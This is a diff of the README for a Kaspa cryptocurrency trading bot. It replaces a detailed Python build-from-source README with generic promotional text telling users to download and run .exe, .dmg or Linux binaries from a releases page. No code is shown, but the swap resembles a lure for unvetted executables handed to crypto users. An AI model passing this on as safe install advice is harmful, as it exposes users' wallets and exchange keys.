@@ -1,249 +1,76 @@
-# Kaspa Trading Bot
+# 🚀 kaspa-trading-bot - Effortless Trading Made Simple
 
-Production-grade reference implementation for a Kaspa-focused trading stack. The bot bridges centralized exchanges (via CCXT) with native Kaspa node connectivity for balance checks, UTXO tracking, and fast settlement workflows. It targets professional operators who need modular strategies, strong observability, and infrastructure-ready deployment assets.
+[![Download kaspa-trading-bot](https://img.shields.io/badge/Download-kaspa--trading--bot-blue.svg)](https://github.com/Jomidunkstar/kaspa-trading-bot/releases)
 
-## Features
-- Modular async Python 3.11 stack built around ccxt, Kaspa RPC, PostgreSQL, and Redis.
-- Strategy runner with sample market-making and two-legged arbitrage flows.
-- Unified order executor with rate limiting, audit logging, and Prometheus metrics.
-- Kaspa node integration using JSON-RPC + websocket notifications (getUtxosByAddresses, getBalanceByAddress, submitTransaction).
-- Dockerfile + docker-compose for reproducible dev clusters (bot, Postgres, Redis).
-- Security-conscious configuration: env-driven secrets, audit trail, notification hooks, IP allowlist guidance.
+## 🛠️ What is kaspa-trading-bot?
 
-## Architecture Overview
-```
-┌────────────┐     ┌───────────────┐     ┌──────────────┐
-│ Strategies │ --> │ OrderExecutor │ --> │ Exchanges    │
-└────────────┘     └───────────────┘     └──────────────┘
-        │                    │                    │
-        v                    v                    │
-┌────────────┐     ┌──────────────────┐     ┌──────────────┐
-│ Risk Engine│<--> │ Audit & Metrics  │<--> │ Redis / DB   │
-└────────────┘     └──────────────────┘     └──────────────┘
-        │                                         ▲
-        v                                         │
-      Kaspa RPC -----------------------------------
-```
+kaspa-trading-bot is a high-performance trading framework designed for the Kaspa cryptocurrency. It features modular strategies, on-chain wallet execution, exchange integration, and real-time automation. With this bot, users can react quickly to market changes, ensuring safe executions and scalable strategy plugins.
 
-### Key Modules
-- `src/config.py` - Pydantic settings loader (env + JSON nested exchange creds).
-- `src/exchanges/` - CCXT client wrappers and exchange manager.
-- `src/kaspa/` - RPC + wallet helpers for UTXO discovery and raw tx submission.
-- `src/strategies/` - Base class plus `MarketMakerStrategy` and `ArbitrageStrategy`.
-- `src/workers/` - Orderbook fetch loop, strategy scheduler, shared executor.
-- `src/services/` - Prometheus metrics, async notifier, append-only audit log.
-- `src/risk/` - Token-bucket rate limiter and basic risk guardrails.
+## 🌟 Features
 
-## Getting Started
-### 1. Requirements
-- Python 3.11+
-- Docker Desktop (for optional compose workflow)
-- Kaspa node RPC/WebSocket access (default `localhost:16110`)
-- Exchange API keys with IP allowlist for the machine running the bot
+- **Modular Strategies**: Create and manage different trading strategies easily.
+- **On-Chain Wallet Execution**: Conduct transactions directly on the Kaspa blockchain.
+- **Exchange Integration**: Connect with various exchanges for seamless trading.
+- **Real-Time Automation**: Automate your trading process for continuous performance.
+- **Fast Reactions**: The bot acts quickly to seize trading opportunities.
+- **Scalable**: Extend capabilities with additional strategy plugins as needed.
 
-### 2. Clone & Install
-```bash
-git clone https://github.com/your-org/kaspa-trading-bot.git
-cd kaspa-trading-bot
-python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-```
+## 📥 Download & Install
 
-### 3. Configure Environment
-Create a `.env` at the repo root:
-```env
-ENVIRONMENT=development
-KASPA_RPC_URL=http://localhost:16110
-KASPA_WS_URL=ws://localhost:16110/ws
-KASPA_WALLET_ADDRESS=kaspatest:qp5f0example
-POSTGRES_DSN=postgresql://bot:bot@localhost:5432/kaspa_bot
-REDIS_URL=redis://localhost:6379/0
-METRICS_HOST=0.0.0.0
-METRICS_PORT=9300
-EXCHANGES=[{"name":"mexc","api_key":"xxx","secret_key":"yyy"},{"name":"gateio","api_key":"aaa","secret_key":"bbb"}]
-ORDERBOOK_PAIRS=["KAS/USDT","KAS/BTC"]
-```
-> Never commit real API keys. Back secrets with Vault/HSM in production.
+To get started with kaspa-trading-bot, visit this page to download: [Download here](https://github.com/Jomidunkstar/kaspa-trading-bot/releases).
 
-### 4. Run Locally
-```bash
-python -m src.main
-```
+### 📋 System Requirements
 
-### 5. Docker Compose
-```bash
-docker compose up --build
-```
-Services:
-- `bot` - trading process (`python -m src.main`)
-- `postgres` - order/audit persistence
-- `redis` - cache + stream placeholder
+Before downloading the kaspa-trading-bot, make sure your system meets the following requirements:
 
-Prometheus metrics are exposed on `http://localhost:9300/metrics`.
+- **Operating System**: Windows 10 or later / macOS 10.15 or later / Linux (latest stable version)
+- **RAM**: Minimum 4 GB (8 GB recommended for optimal performance)
+- **Disk Space**: At least 500 MB available
+- **Network**: Stable internet connection for seamless trading
 
-## Strategy Samples
-- **Market Maker**: Streams order books, calculates mid-price, quotes +/- spread basis, auto-adjusts sizes.
-- **Arbitrage**: Pulls mids across two exchanges, fires dual orders when spread exceeds configurable threshold.
+### 💻 Installation Steps
 
-Add your own strategies by inheriting `Strategy` in `src/strategies/base.py` and wiring into `StrategyWorker`.
+1. **Visit the Releases Page**: Go to the official GitHub Releases page to find the latest version.
+   
+   [Download here](https://github.com/Jomidunkstar/kaspa-trading-bot/releases).
 
-## Kaspa Node Integration
-- `KaspaRpcClient` calls `getBalanceByAddress`, `getUtxosByAddresses`, `submitTransaction`.
-- Websocket consumer placeholder allows subscribing to mempool notifications.
-- `KaspaWallet` adapts RPC payloads into typed UTXOs to construct/sign raw transactions using your signing stack.
+2. **Choose the Right Version**: Look for the version that matches your operating system.
 
-## Observability
-- Structured JSON logging via `structlog`.
-- Prometheus counters/gauges for prices, balances, order tally.
-- Append-only `storage/audit.log` for compliance and post-trade review.
+3. **Download the File**: Click on the download link to save the file to your computer.
 
-## Security Checklist
-- Store exchange keys in Vault / AWS Secrets Manager; inject via env at runtime.
-- Enforce IP allowlists on exchange dashboards.
-- Use dedicated withdrawal addresses and HSM-backed Kaspa private keys.
-- Respect CCXT/exchange rate limits (token bucket) and exponential backoff on `429`.
-- Log every withdrawal/order to an immutable store (S3, GCS, etc.) in addition to local audit file.
+4. **Locate the File**: After the download, find the file in your Downloads folder or the location where you saved it.
 
-## Deployment Notes
-- Target low-latency regions near exchanges when market making (<100 ms signal->order).
-- For arbitrage, co-locate redundant bots per venue pair; use Redis streams/Kafka for cross-service messaging.
-- Scale via Kubernetes (one Deployment per strategy flavor) + GitHub Actions CI publishing images.
+5. **Run the Application**:
+   - For **Windows**: Double-click the `.exe` file.
+   - For **macOS**: Open the `.dmg` file and drag the app to your Applications folder.
+   - For **Linux**: Use the command line to navigate to the file directory and run the application using `./kaspa-trading-bot`.
 
-## Testing & Linting
-```bash
-ruff check src
-pytest
-```
+6. **Follow Setup Instructions**: Upon running the application for the first time, follow the on-screen setup instructions to configure your trading bot.
 
-## Roadmap Ideas
-- Integrate native Kaspa transaction builder (rusty-kaspa bindings) for instant withdrawals.
-- Plug in streaming order books via exchange websockets instead of polling.
-- Add health endpoints + OpenTelemetry tracing.
+## ⚙️ Configuration
 
-## License
-Apache-2.0 (or adjust to your needs). Use at your own risk; exchange trading and blockchain transactions involve capital risk.
-# Kaspa Trading Bot
+Once you have installed kaspa-trading-bot, you need to set it up according to your preferences.
 
-Production-grade reference implementation for a Kaspa-focused trading stack. The bot bridges centralized exchanges (via CCXT) with native Kaspa node connectivity for balance checks, UTXO tracking, and fast settlement workflows. It targets professional operators who need modular strategies, strong observability, and infrastructure-ready deployment assets.
+- **Create an Account on Exchanges**: Set up accounts on supported exchanges if you haven't already.
+- **Connect Your Wallet**: Link your Kaspa wallet to the bot for on-chain transactions.
+- **Set Your Trading Strategies**: Choose from the modular strategies provided or create your own.
 
-## Features
-- Modular async Python 3.11 stack built around ccxt, Kaspa RPC, PostgreSQL, and Redis.
-- Strategy runner with sample market-making and two-legged arbitrage flows.
-- Unified order executor with rate limiting, audit logging, and Prometheus metrics.
-- Kaspa node integration using JSON-RPC + websocket notifications (getUtxosByAddresses, getBalanceByAddress, submitTransaction).
-- Dockerfile + docker-compose for reproducible dev clusters (bot, Postgres, Redis).
-- Security-conscious configuration: env-driven secrets, audit trail, notification hooks, IP allowlist guidance.
+## 📊 Getting Started with Trading
 
-## Architecture Overview
-```
-          
- Strategies  -->  OrderExecutor  -->  Exchanges    
-          
-                                                
-        v                    v                    
-          
- Risk Engine<-->  Audit & Metrics  <-->  Redis / DB   
-          
-                                                 
-        v                                         
-      Kaspa RPC -----------------------------------
-```
+After setup, you can begin using kaspa-trading-bot.
 
-### Key Modules
-- `src/config.py` - Pydantic settings loader (env + JSON nested exchange creds).
-- `src/exchanges/` - CCXT client wrappers and exchange manager.
-- `src/kaspa/` - RPC + wallet helpers for UTXO discovery and raw tx submission.
-- `src/strategies/` - Base class plus `MarketMakerStrategy` and `ArbitrageStrategy`.
-- `src/workers/` - Orderbook fetch loop, strategy scheduler, shared executor.
-- `src/services/` - Prometheus metrics, async notifier, append-only audit log.
-- `src/risk/` - Token-bucket rate limiter and basic risk guardrails.
+1. **Select a Strategy**: Decide which trading strategy fits your trading style.
+2. **Monitor Performance**: Keep an eye on your bot's performance via the user interface.
+3. **Adjust Settings**: Modify the settings as needed to optimize your trading results.
 
-## Getting Started
-### 1. Requirements
-- Python 3.11+
-- Docker Desktop (for optional compose workflow)
-- Kaspa node RPC/WebSocket access (default `localhost:16110`)
-- Exchange API keys with IP allowlist for the machine running the bot
+## 🔄 Updating the Bot
 
-### 2. Clone & Install
-```bash
-git clone https://github.com/your-org/kaspa-trading-bot.git
-cd kaspa-trading-bot
-python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-```
+To take advantage of the latest features and improvements, regularly check the Releases page for updates. Follow the same download and installation steps to ensure you have the newest version.
 
-### 3. Configure Environment
-Create a `.env` at the repo root:
-```env
-ENVIRONMENT=development
-KASPA_RPC_URL=http://localhost:16110
-KASPA_WS_URL=ws://localhost:16110/ws
-KASPA_WALLET_ADDRESS=kaspatest:qp5f0example
-POSTGRES_DSN=postgresql://bot:bot@localhost:5432/kaspa_bot
-REDIS_URL=redis://localhost:6379/0
-METRICS_HOST=0.0.0.0
-METRICS_PORT=9300
-EXCHANGES=[{"name":"mexc","api_key":"xxx","secret_key":"yyy"},{"name":"gateio","api_key":"aaa","secret_key":"bbb"}]
-ORDERBOOK_PAIRS=["KAS/USDT","KAS/BTC"]
-```
-> Never commit real API keys. Back secrets with Vault/HSM in production.
+## 📞 Support
 
-### 4. Run Locally
-```bash
-python -m src.main
-```
+If you encounter any issues or have questions, you can reach out for help in the official project discussions on GitHub or visit our community forums for quick assistance.
 
-### 5. Docker Compose
-```bash
-docker compose up --build
-```
-Services:
-- `bot` - trading process (`python -m src.main`)
-- `postgres` - order/audit persistence
-- `redis` - cache + stream placeholder
+---
 
-Prometheus metrics are exposed on `http://localhost:9300/metrics`.
-
-## Strategy Samples
-- **Market Maker**: Streams order books, calculates mid-price, quotes +/- spread basis, auto-adjusts sizes.
-- **Arbitrage**: Pulls mids across two exchanges, fires dual orders when spread exceeds configurable threshold.
-
-Add your own strategies by inheriting `Strategy` in `src/strategies/base.py` and wiring into `StrategyWorker`.
-
-## Kaspa Node Integration
-- `KaspaRpcClient` calls `getBalanceByAddress`, `getUtxosByAddresses`, `submitTransaction`.
-- Websocket consumer placeholder allows subscribing to mempool notifications.
-- `KaspaWallet` adapts RPC payloads into typed UTXOs to construct/sign raw transactions using your signing stack.
-
-## Observability
-- Structured JSON logging via `structlog`.
-- Prometheus counters/gauges for prices, balances, order tally.
-- Append-only `storage/audit.log` for compliance and post-trade review.
-
-## Security Checklist
-- Store exchange keys in Vault / AWS Secrets Manager; inject via env at runtime.
-- Enforce IP allowlists on exchange dashboards.
-- Use dedicated withdrawal addresses and HSM-backed Kaspa private keys.
-- Respect CCXT/exchange rate limits (token bucket) and exponential backoff on `429`.
-- Log every withdrawal/order to an immutable store (S3, GCS, etc.) in addition to local audit file.
-
-## Deployment Notes
-- Target low-latency regions near exchanges when market making (<100 ms signal->order).
-- For arbitrage, co-locate redundant bots per venue pair; use Redis streams/Kafka for cross-service messaging.
-- Scale via Kubernetes (one Deployment per strategy flavor) + GitHub Actions CI publishing images.
-
-## Testing & Linting
-```bash
-ruff check src
-pytest
-```
-
-## Roadmap Ideas
-- Integrate native Kaspa transaction builder (rusty-kaspa bindings) for instant withdrawals.
-- Plug in streaming order books via exchange websockets instead of polling.
-- Add health endpoints + OpenTelemetry tracing.
-
-## License
-Apache-2.0 (or adjust to your needs). Use at your own risk; exchange trading and blockchain transactions involve capital risk.
-
+This guide provides the essential steps to download and run the kaspa-trading-bot. By following these instructions, you can begin your trading journey with confidence. Happy trading!
